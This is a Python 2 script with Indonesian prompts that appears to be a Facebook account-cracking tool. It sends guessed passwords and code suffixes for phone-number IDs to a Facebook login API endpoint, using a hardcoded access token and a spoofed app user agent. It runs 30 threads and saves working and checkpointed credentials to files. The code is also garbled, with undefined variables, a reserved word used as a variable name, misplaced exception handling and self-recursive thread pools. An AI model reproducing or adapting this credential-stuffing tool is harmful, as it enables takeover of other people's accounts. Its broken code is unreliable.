#!/usr/bin/python
import smtplib
import time
import os
import requests
import sys
import random
os.system('rm -rf .txt')
for n in range(2000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 upil.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 8.1.0; id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Selamat Tinggal '
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')

nom = []
id = []
pass = []


cod = ["012345", "123456", "234561", "456783","567890", "678901", "6789012", "789012", "890123", "901234", "101234", "111234", "121234", "131234", "141234", "151234", "161234", "171234", "181234", "191234", "201234", "211234", "223456" "234567", "245678", "256789", "267890", "278901", "289012", "290123", "30123", "312345", "323456", "334567", "345678", "456789", "467890", "478901", "489012", "490123", "501234", "512345", "523456", "534567", "545678", "556789", "567890", "578901", "589012", "590123", "60123", "61234", "623456", "637890", "645678", "656789", "667890", "678901", "689012", "690123", "700987", "712938", "723847", "734756", "745610", "750192", "767089", "778019", "789012", "790129", "801928", "812837", "823948", "834756", "841028", "8545", "8612", "87", "88756", "89012", "9012"]

def login():
	os.system('clear')
	os.system('figlet CODE FB')
	nom = raw_input("\033[1;93mNOMOR HP \033[1;97m: ")
	for x in nom(data):
		id.append(len(id))


def main(arg):
	global cpb,oks
	user = arg
	try:
		os.mkdir('save')
		except OSError:
			pass
	try:
		pass1 = 786786
		code = open('cod', 'a')
		data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=' + code + '&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
		q = json.load(data)
		if 'access_token' in q:
			print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + user +   ' | '  +  pass1 + code
			okb = open('save/successfull.txt', 'a')
			okb.write(user+'|'+pass1+code+'\n')
			okb.close()
			oks.append(user+pass1+code)
		else:
			if 'www.facebook.com' in q['error_msg']:
				print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + user +   ' | '  +  pass1 + code
				cps = open('save/checkpoint.txt', 'a')
				cps.write(user+'|'+pass1+code+'\n')
				cps.close()
				cpb.append(user+pass1+code)

	except:
		pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;96m="
	print '\033[1;96m[✓] \033[1;93mProcess Telah Selesai ...'
	print '\033[1;96m[✓] \033[1;34mTotal OK : \033[1;97m'+str(len(oks))
	print '\033[1;96m[✓] \033[1;93mTotal CP  : \033[1;97m'+str(len(cpb))
	print('\033[1;96m[✓] \033[1;91mCP File Telah Disimpan : save/cp.txt')
	raw_input('\033[1;96m[\033[1;97mKembali\033[1;96m]')
	login()


if __name__=='__main__':
	main()
